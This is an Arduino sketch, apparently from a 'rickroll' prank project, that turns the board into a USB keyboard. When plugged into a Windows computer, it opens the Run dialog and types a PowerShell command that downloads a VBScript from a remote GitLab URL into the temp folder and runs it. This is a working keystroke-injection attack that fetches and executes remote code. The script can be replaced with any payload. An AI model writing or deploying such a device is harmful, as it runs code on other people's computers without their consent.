/**
 *  Author: Sam van der Kris
 *  GitLab: https://gitlab.com/WarKitteh/arduino-hid-rickroll
 */

#include "Keyboard.h"

void typeKey(int key) {
	Keyboard.press(key);
	delay(50);
	Keyboard.release(key);
}

void runPayload() {
	Keyboard.begin();
	// Give Windows some time to recognize the Arduino as a human interface device
	delay(1000);

	// Open CMD
	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('r');
	Keyboard.releaseAll();
	delay(100);
	Keyboard.print("cmd");
	delay(100);
	typeKey(KEY_RETURN);

	delay(100);

	// Download and run rickroll.vbs and exit when done
	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%TEMP%\\rickroll.vbs'); && start %TEMP%\\rickroll.vbs && exit");
	delay(100);
	typeKey(KEY_RETURN);

	Keyboard.end();
}

void setup() {
	// Uncomment this if you DON'T use a button on your Arduino
	//runPayload();
}

void loop() {
	// Uncomment this if you DO use a button on your Arduino (button has to be between pin 3 and ground)
	/*pinMode(3, INPUT_PULLUP);
	if (digitalRead(3) == LOW) {
		runPayload();
		delay(500);
	}*/
}